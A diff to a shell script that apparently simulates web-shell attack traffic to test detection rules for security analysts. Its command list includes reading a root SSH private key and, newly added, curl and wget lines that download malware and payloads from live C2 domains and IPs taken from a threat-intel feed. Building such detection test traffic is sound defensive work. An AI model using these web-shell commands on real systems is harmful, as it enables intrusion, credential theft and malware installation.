@@ -22,10 +22,16 @@ curl -s -o /dev/null -w "  %{http_code} POST /upload (${shellname})\n" \
 rm -f "$shell"
 
 # Post-exploitation: invoke the uploaded shell a few times with different commands. Each request is
-# GET /files/<shell>?cmd=<command>, which matches rule 100130 (a request for an uploaded .php).
+# GET /files/<shell>?cmd=<command>, which matches rule 100130 (a request for an uploaded .php). The
+# malware pull uses a real C2 domain/IP from the threat-intel list (pick_ioc, same source c2_beacon
+# uses), so the command's destination is a live IOC the analyst can confirm on external OSINT.
+IFS='|' read -r c2dom _cdl _cds <<<"$(pick_ioc c2 domain)"; c2dom="${c2dom:-ma.zk89.net}"
+IFS='|' read -r c2ip  _cil _cis <<<"$(pick_ioc c2 ip)";     c2ip="${c2ip:-185.220.101.44}"
 cmds=(id whoami 'uname%20-a' hostname 'ls%20-la%20/root'
       'cat%20/root/.ssh/id_rsa' 'crontab%20-l' 'ps%20aux' 'netstat%20-antp'
-      'curl%20http://185.220.101.44/t.sh' 'wget%20-qO-%20http://185.220.101.44/lin.sh')
+      "curl%20https://${c2dom}/malware.exe%20-o%20/tmp/svchost.exe"
+      "wget%20https://${c2dom}/payload.sh%20-O%20/tmp/p"
+      "curl%20http://${c2ip}/beacon%20-o%20/tmp/b")
 n="$(rint 6 9)"
 for ((i=1; i<=n; i++)); do
   hit GET "/files/${shellname}?cmd=$(pick "${cmds[@]}")" "$ip" "$ua"
